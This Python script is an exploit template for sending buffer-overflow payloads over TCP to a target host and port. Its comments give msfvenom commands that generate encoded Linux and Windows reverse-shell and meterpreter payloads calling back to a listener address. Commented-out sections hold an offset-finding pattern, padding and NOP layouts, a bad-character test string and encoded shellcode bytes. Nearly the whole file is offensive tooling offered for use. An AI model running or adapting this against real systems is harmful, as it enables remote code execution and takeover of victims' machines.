#!/usr/bin/env python3

import socket

# -------------------------- INFO --------------------------

# shell_reverse_tcp - Linux OS
# msfvenom --platform linux -a x86 -e x86/shikata_ga_nai -p linux/x86/shell_reverse_tcp LHOST=192.168.8.185 PORT=9000 EXITFUNC=thread -f python -b \x00\x0a\x0d\xff
# msfvenom --platform linux -a x64 -e x64/xor -p linux/x64/shell_reverse_tcp LHOST=192.168.8.185 PORT=9000 EXITFUNC=thread -f python -b \x00\x0a\x0d\xff

# meterpreter_reverse_tcp - Linux OS
# msfvenom --platform linux -a x86 -e x86/shikata_ga_nai -p linux/x86/meterpreter_reverse_tcp LHOST=192.168.8.185 PORT=9000 EXITFUNC=thread -f python
# msfvenom --platform linux -a x64 -e x64/xor -p linux/x64/meterpreter_reverse_tcp LHOST=192.168.8.185 PORT=9000 EXITFUNC=thread -f python

# shell_reverse_tcp - Windows OS
# msfvenom --platform windows -a x86 -e x86/shikata_ga_nai -p windows/shell_reverse_tcp LHOST=192.168.8.185 LPORT=9000 EXITFUNC=thread -f python -b \x00\x0a\x0d\xff
# msfvenom --platform windows -a x64 -e x64/xor -p windows/x64/shell_reverse_tcp LHOST=192.168.8.185 LPORT=9000 EXITFUNC=thread -f python -b \x00\x0a\x0d\xff

# meterpreter_reverse_tcp - Windows OS
# msfvenom --platform windows -a x86 -e x86/shikata_ga_nai -p windows/meterpreter_reverse_tcp LHOST=192.168.8.185 LPORT=9000 EXITFUNC=thread -f python
# msfvenom --platform windows -a x64 -e x64/xor -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.8.185 LPORT=9000 EXITFUNC=thread -f python

# target address and port number
addr = "192.168.8.185"
port = 9000

# socket timeout
timeout = 4

# socket stream receive buffer size
size = 2048

# socket stream receive buffer encoding, e.g. ASCII, UTF-8, ISO-8859-1, etc.
encoding = "UTF-8"

# prepend bytes
prepend =  b""
# unique string pattern - current length 1024
# prepend += b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0B"
# prepend += b"A" * 128 + b"B" * 4
# prepend += b"A" * 128 + b"\xff\xff\xff\xff" + b"\x90" * 32

# bad characters
# prepend += b"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

# shellcode
buf =  b""
# buf += b"\x29\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81"
# buf += b"\x76\x0e\xf5\xdd\xf1\xe9\x83\xee\xfc\xe2\xf4\x09\x35"
# buf += b"\x73\xe9\xf5\xdd\x91\x60\x10\xec\x31\x8d\x7e\x8d\xc1"
# buf += b"\x62\xa7\xd1\x7a\xbb\xe1\x56\x83\xc1\xfa\x6a\xbb\xcf"
# buf += b"\xc4\x22\x5d\xd5\x94\xa1\xf3\xc5\xd5\x1c\x3e\xe4\xf4"
# buf += b"\x1a\x13\x1b\xa7\x8a\x7a\xbb\xe5\x56\xbb\xd5\x7e\x91"
# buf += b"\xe0\x91\x16\x95\xf0\x38\xa4\x56\xa8\xc9\xf4\x0e\x7a"
# buf += b"\xa0\xed\x3e\xcb\xa0\x7e\xe9\x7a\xe8\x23\xec\x0e\x45"
# buf += b"\x34\x12\xfc\xe8\x32\xe5\x11\x9c\x03\xde\x8c\x11\xce"
# buf += b"\xa0\xd5\x9c\x11\x85\x7a\xb1\xd1\xdc\x22\x8f\x7e\xd1"
# buf += b"\xba\x62\xad\xc1\xf0\x3a\x7e\xd9\x7a\xe8\x25\x54\xb5"
# buf += b"\xcd\xd1\x86\xaa\x88\xac\x87\xa0\x16\x15\x82\xae\xb3"
# buf += b"\x7e\xcf\x1a\x64\xa8\xb5\xc2\xdb\xf5\xdd\x99\x9e\x86"
# buf += b"\xef\xae\xbd\x9d\x91\x86\xcf\xf2\x22\x24\x51\x65\xdc"
# buf += b"\xf1\xe9\xdc\x19\xa5\xb9\x9d\xf4\x71\x82\xf5\x22\x24"
# buf += b"\xb9\xa5\x8d\xa1\xa9\xa5\x9d\xa1\x81\x1f\xd2\x2e\x09"
# buf += b"\x0a\x08\x66\x83\xf0\xb5\x31\x41\xfd\x64\x99\xeb\xf5"
# buf += b"\xfe\xd9\x60\x13\xb7\xe1\xbf\xa2\xb5\x68\x4c\x81\xbc"
# buf += b"\x0e\x3c\x70\x1d\x85\xe5\x0a\x93\xf9\x9c\x19\xb5\x01"
# buf += b"\x5c\x57\x8b\x0e\x3c\x9d\xbe\x9c\x8d\xf5\x54\x12\xbe"
# buf += b"\xa2\x8a\xc0\x1f\x9f\xcf\xa8\xbf\x17\x20\x97\x2e\xb1"
# buf += b"\xf9\xcd\xe8\xf4\x50\xb5\xcd\xe5\x1b\xf1\xad\xa1\x8d"
# buf += b"\xa7\xbf\xa3\x9b\xa7\xa7\xa3\x8b\xa2\xbf\x9d\xa4\x3d"
# buf += b"\xd6\x73\x22\x24\x60\x15\x93\xa7\xaf\x0a\xed\x99\xe1"
# buf += b"\x72\xc0\x91\x16\x20\x66\x11\xf4\xdf\xd7\x99\x4f\x60"
# buf += b"\x60\x6c\x16\x20\xe1\xf7\x95\xff\x5d\x0a\x09\x80\xd8"
# buf += b"\x4a\xae\xe6\xaf\x9e\x83\xf5\x8e\x0e\x3c"

# append bytes
append = b""

# final payload
payload = prepend + buf + append

# ----------------------- TASK BEGIN -----------------------

error = False
soc = None
try:
	soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	soc.settimeout(timeout)
	try:
		print(("Connecting to the target {0}:{1}").format(addr, port))
		soc.connect((addr, port))
	except socket.timeout:
		error = True
		print("Connecting to the target timed out")
	if not error:
		try:
			print(("Sending the payload... Size in bytes: {0}").format(len(buf)))
			soc.send(payload)
		except socket.timeout:
			error = True
			print("Sending the payload timed out")
		if not error:
			print("")
			response = ""
			try:
				print("Waiting for the response...")
				while True:
					read = soc.recv(size)
					if not read:
						break
					response += read.decode(encoding)
			except socket.timeout:
				print("Waiting for the response timed out")
			if not response:
				print("No response has been received or is empty")
			else:
				print("---------- RESPONSE START ----------")
				print(response)
				print("----------- RESPONSE END -----------")
except socket.error as ex:
	print(("EXCEPTION: {0}").format(ex))
finally:
	if soc:
		soc.close()

# ------------------------ TASK END ------------------------
